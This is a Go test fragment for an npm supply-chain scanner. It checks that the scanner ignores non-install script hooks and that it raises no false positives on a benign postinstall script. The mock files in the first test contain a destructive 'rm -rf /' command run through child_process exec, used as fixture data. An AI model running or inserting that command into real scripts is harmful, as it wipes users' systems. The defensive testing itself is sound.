func TestAnalyzeNPMScriptFiles_SkipsNonInstallHooks(t *testing.T) {
	scripts := map[string]string{
		"test":  "node scripts/evil-test.js",
		"build": "node scripts/evil-build.js",
		"start": "node scripts/evil-start.js",
	}

	mockFiles := map[string]string{
		"scripts/evil-test.js":  `const { exec } = require('child_process'); exec('rm -rf /');`,
		"scripts/evil-build.js": `const { exec } = require('child_process'); exec('rm -rf /');`,
		"scripts/evil-start.js": `const { exec } = require('child_process'); exec('rm -rf /');`,
	}

	readFile := func(path string) (string, error) {
		if content, ok := mockFiles[path]; ok {
			return content, nil
		}
		return "", fmt.Errorf("file not found: %s", path)
	}

	patterns := AnalyzeNPMScriptFiles(scripts, readFile)

	if len(patterns) != 0 {
		t.Errorf("Expected no patterns for non-install hooks, got %d: %v", len(patterns), patterns)
	}
}

// Test: Clean script file produces no findings
// Justification: Legitimate postinstall scripts (node-gyp rebuild, type generation, etc.)
//                should not produce false positives that inflate risk scores.
// Source: OSSF Scorecard methodology — scoring must not penalize legitimate practices.
// Methodology: Create a benign postinstall.js that does standard setup tasks
// Result: Returns empty patterns — no false positives
func TestAnalyzeNPMScriptFiles_CleanScript(t *testing.T) {
	scripts := map[string]string{
		"postinstall": "node scripts/postinstall.js",
	}

	mockFiles := map[string]string{
		"scripts/postinstall.js": `
const path = require('path');
const fs = require('fs');

// Copy config template
const src = path.join(__dirname, 'config.template.json');
const dest = path.join(__dirname, '..', 'config.json');

if (!fs.existsSync(dest)) {
  fs.copyFileSync(src, dest);
  console.log('Config file created');
}
`,
	}

	readFile := func(path string) (string, error) {
		if content, ok := mockFiles[path]; ok {
			return content, nil
		}
		return "", fmt.Errorf("file not found: %s", path)
	}

	patterns := AnalyzeNPMScriptFiles(scripts, readFile)

	if len(patterns) != 0 {
		patternNames := []string{}
		for _, p := range patterns {
			patternNames = append(patternNames, fmt.Sprintf("%s (match: %s)", p.Pattern, p.Match))
		}
		t.Errorf("Expected no patterns for clean script, got: %s", strings.Join(patternNames, ", "))
	}
}
